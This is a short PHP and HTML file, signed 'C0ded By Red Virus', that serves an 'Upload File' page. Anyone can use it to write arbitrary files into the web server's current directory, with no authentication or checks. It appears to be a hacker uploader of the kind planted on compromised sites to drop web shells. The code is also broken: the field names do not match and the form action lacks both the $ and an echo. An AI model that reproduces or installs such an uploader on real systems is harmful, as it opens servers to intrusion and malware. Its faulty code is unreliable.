<!DOCTYPE html>
<!-- C0ded By Red Virus -->
<html>
<head>
	<title>Upload File</title>
<style>
	body{
		background-image:url(https://j.top4top.io/p_16654ocjt1.jpg);
	}
</style>
</head>
<body>
	<p style="color: white">Upload Your File</p>
	<form action="<?php SERVER['PHP_SELF'];?>" method="post" enctype="multipart/form-data">
		<input type="file" name="upload"/>
		<input type="submit" name="exe" value="Upload">
	</form>
	<br/>
</body>
</html>

<?php
if(isset($_POST['exe'])){
	$name = $_FILES['file']['name'];
	$path = getcwd() . "/" . $name;
	if(move_uploaded_file($_FILES['file']['tmp_name'],$path)){
		echo "has been uploaded";
	}
	else{
		echo "There was an error uploading the file";
	}

	
}
